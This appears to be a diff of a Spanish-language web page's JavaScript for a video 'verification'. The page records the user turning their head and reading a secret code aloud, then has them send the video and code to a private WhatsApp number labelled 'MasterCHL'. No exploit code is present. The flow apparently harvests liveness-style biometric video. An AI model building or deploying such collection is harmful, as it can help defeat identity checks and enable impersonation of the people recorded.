@@ -228,22 +228,21 @@
         });
 
         function iniciarPasos() {
-            let paso = 1;
-            const interval = setInterval(() => {
-                if (paso === 1) {
-                    challenge.textContent = "1. Gira tu cabeza a la DERECHA";
-                    paso++;
-                } else if (paso === 2) {
-                    challenge.textContent = "2. Gira tu cabeza a la IZQUIERDA";
-                    paso++;
-                } else if (paso === 3) {
-                    challenge.innerHTML = `3. Mira al CENTRO y di en voz alta:<br><strong style="color:red; font-size:1.2em;">"Mi código es ${codigoSecreto}"</strong>`;
-                    paso++;
-                    clearInterval(interval);
-                    // Iniciar grabación 2 segundos después de mostrar el código
-                    setTimeout(iniciarGrabacion, 2000);
-                }
-            }, 3000);
+            // Paso 1: Derecha (5 segundos para leer)
+            challenge.textContent = "1. Gira tu cabeza a la DERECHA";
+            
+            setTimeout(() => {
+                // Paso 2: Izquierda (5 segundos para leer)
+                challenge.textContent = "2. Gira tu cabeza a la IZQUIERDA";
+                
+                setTimeout(() => {
+                    // Paso 3: Código Secreto (SE QUEDA AQUÍ HASTA QUE PRESIONES ENVIAR)
+                    challenge.innerHTML = `3. Mira al CENTRO y di en voz alta:<br><strong style="color:red; font-size:1.5em;">"Mi código es ${codigoSecreto}"</strong><br><span style="font-size:14px; color:#555;">(No cierres la ventana, espera la grabación)</span>`;
+                    
+                    // La grabación comienza automáticamente después de 3 segundos de mostrar el código
+                    setTimeout(iniciarGrabacion, 3000);
+                }, 5000); // 5 segundos para ver el código
+            }, 5000); // 5 segundos para el primer paso
         }
 
         function iniciarGrabacion() {
@@ -259,11 +258,26 @@
             };
 
             mediaRecorder.onstop = () => {
-                video.srcObject = null; // Parar cámara
+                // Detener cámara y cambiar botones
+                video.srcObject = null; 
                 recordBtn.style.display = 'none';
                 sendBtn.style.display = 'block';
-                finalInstruct.style.display = 'block';
-                challenge.textContent = "¡Grabación lista! Pulsa ENVIAR.";
+
+                // --- NUEVO: MOSTRAR LA GUÍA DE PASOS ---
+                challenge.innerHTML = `
+                    <div style="text-align: left; font-size: 14px; color: #333;">
+                        <strong>✅ ¡Video grabado con éxito!</strong><br><br>
+                        <strong>Paso 1:</strong> Minimiza esta página (no la cierres).<br><br>
+                        <strong>Paso 2:</strong> Abre tu <strong>Galería</strong> (o "Fotos").<br><br>
+                        <strong>Paso 3:</strong> Busca el video más reciente. Se llama <strong>"video.webm"</strong> o similar.<br><br>
+                        <strong>Paso 4:</strong> Abre WhatsApp, busca este chat y presiona el ícono del clip 📎.<br><br>
+                        <strong>Paso 5:</strong> Selecciona "Galería", busca tu video y envíalo.<br><br>
+                        <em>Cuando hayas enviado el video, vuelve aquí y presiona "YA ENVIÉ".</em>
+                    </div>
+                `;
+                
+                // Cambiar el texto del botón para que sea más claro
+                sendBtn.textContent = "YA ENVIÉ EL VIDEO";
             };
 
             mediaRecorder.start();
@@ -275,19 +289,18 @@
                 }
             }, 10000);
         }
-
         // --- 5. ENVIAR A WHATSAPP ---
         sendBtn.addEventListener('click', () => {
             sendBtn.disabled = true;
-            sendBtn.textContent = "ENVIANDO...";
+            sendBtn.textContent = "CONFIRMANDO...";
             
-            // Mensaje de WhatsApp
-            const mensaje = `🔒 VERIFICACIÓN MASTERCHL%0A%0A👤 Usuario: ${token}%0A%0A✅ Código verificado: ${codigoSecreto}%0A%0A⚠️ Por favor, adjunte el video de la verificación.`;
+            // Mensaje de confirmación (ya no pide adjuntar video)
+            const mensaje = `🔒 VERIFICACIÓN MASTERCHL%0A%0A👤 Usuario: ${token}%0A%0A✅ Código verificado: ${codigoSecreto}%0A%0A✅ El usuario confirma haber adjuntado el video correctamente.`;
             
             const url = `https://wa.me/${MY_WHATSAPP}?text=${mensaje}`;
             
             // Mostrar éxito y abrir WhatsApp
-            successMsg.textContent = "¡Verificación enviada! Revisa tu WhatsApp.";
+            successMsg.textContent = "¡Proceso completado! El MasterCHL revisará tu caso.";
             successMsg.style.display = 'block';
             mainContent.style.display = 'none';
             
